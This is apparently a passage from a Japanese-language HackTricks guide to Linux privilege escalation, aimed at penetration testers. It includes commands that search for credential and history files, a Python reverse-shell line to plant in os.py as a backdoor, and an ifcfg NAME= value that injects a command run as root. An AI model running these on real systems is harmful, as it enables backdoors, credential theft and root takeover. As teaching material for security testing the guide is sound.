### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを確認してください。これは **パスワードを含む可能性がある複数のファイル** を検索します。\
**別の興味深いツール** として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、これは Windows, Linux & Mac のローカルコンピュータに保存された大量のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**その中に興味深い／機密情報を見つけられる** かもしれません。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、いくつかの "**bad**" に設定された（backdoored?）**監査ログ**は、監査ログ内にパスワードを**記録する**ことを可能にする場合があり、その方法はこの投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むために** [**adm**](interesting-groups-linux-pe/index.html#adm-group) グループは非常に役に立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に "**password**" が含まれているファイルも確認するべきです。また、ログ内の IPs や emails、hashes regexps もチェックしてください。\
ここでこれらすべての方法を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最新のチェックを確認できます。

## 書き込み可能なファイル

### Python library hijacking

pythonスクリプトが実行される**どこから**が分かっていて、かつそのフォルダに**書き込みできる**、あるいは**pythonライブラリを変更できる**場合、OSライブラリを改変してバックドアを仕込むことができます（pythonスクリプトが実行される場所に書き込める場合は、os.pyライブラリをコピーして貼り付けてください）。

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザが権限昇格を行える可能性があります。これは `logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。_ /var/log _ だけでなく、ログローテーションが適用されるすべてのディレクトリの権限を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以前に影響します

脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に類似しています。したがって、ログを改変できることが判明した場合は、そのログを誰が管理しているかを確認し、ログをシンボリックリンクに置き換えて権限昇格できないかをチェックしてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

もし何らかの理由でユーザが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを**書き込める**、または既存のものを**修正できる**なら、あなたの **system is pwned**。

Network scripts（例：_ifcg-eth0_）はネットワーク接続に使用されます。見た目はまさに .INI ファイルそのものです。しかし、Linux 上では Network Manager（dispatcher.d）によって \~sourced\~ されます。

私の場合、これらのネットワークスクリプト内の `NAME=` 属性が正しく処理されていません。名前に **white/blank space があると、システムは空白の後の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間に空白があることに注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。これは `start`、`stop`、`restart`、場合によっては `reload` といったサービス操作を行うスクリプトを含み、直接実行するか `/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は **Upstart** に関連しており、Ubuntu によって導入された新しい **service management** で、サービス管理のための設定ファイルを使用します。Upstart への移行が進んでも、互換レイヤにより SysVinit スクリプトが Upstart 設定と併用されることがあります。

**systemd** はモダンな初期化およびサービスマネージャとして登場しており、オンデマンドでのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/`、管理者変更用に `/etc/systemd/system/` に整理されており、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして privileged kernel 機能を userspace manager に公開します。弱い manager 認証（例：FD-order に基づく signature checks や脆弱なパスワード方式）は、ローカルアプリが manager を偽装し、既に root 化されたデバイス上で root に昇格することを可能にする場合があります。詳細とエクスプロイトの情報は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における Regex-driven な service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、それを特権コンテキストで -v オプション付きで実行する可能性があります。許容的なパターン（例: \S の使用）は、/tmp/httpd のような書き込み可能な場所に配置した攻撃者用リスナーにマッチし、root としての実行（CWE-426 Untrusted Search Path）につながる可能性があります。

詳細および他の discovery/monitoring スタックにも適用可能な一般化パターンは以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
